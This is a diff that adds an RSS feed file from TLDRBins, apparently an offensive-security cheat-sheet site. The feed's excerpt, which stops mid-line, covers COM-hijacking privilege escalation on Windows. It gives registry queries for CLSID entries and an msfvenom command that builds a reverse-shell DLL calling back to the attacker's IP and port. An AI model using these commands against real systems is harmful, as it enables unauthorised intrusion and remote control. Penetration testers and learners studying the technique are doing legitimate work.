@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Registry on TLDRBins</title>
+    <link>https://tldrbins.github.io/@registry/</link>
+    <description>Recent content in Registry on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@registry/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Registry</title>
+      <link>https://tldrbins.github.io/registry/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/registry/</guid>
+      <description>Privesc #1: COM Hijacking Windows 1. Query Registry # Queries all CLSID entries recursively reg query HKCR\CLSID /s # Queries CLSID entries containing KEYWORD recursively reg query HKCR\CLSID /s /f &amp;#34;&amp;lt;KEYWORD&amp;gt;&amp;#34; PS C:\Windows\system32&amp;gt; reg query HKCR\CLSID /s /f &amp;#34;zip&amp;#34; reg query HKCR\CLSID /s /f &amp;#34;zip&amp;#34; HKEY_CLASSES_ROOT\CLSID\{2317---[SNIP]---20000} (Default) REG_SZ 7-Zip Shell Extension HKEY_CLASSES_ROOT\CLSID\{2317---[SNIP]---20000}\InprocServer32 (Default) REG_SZ C:\Program Files\7-Zip\7-zip.dll ---[SNIP]--- 2. Create Malicious DLL msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.</description>
+    </item>
+  </channel>
+</rss>
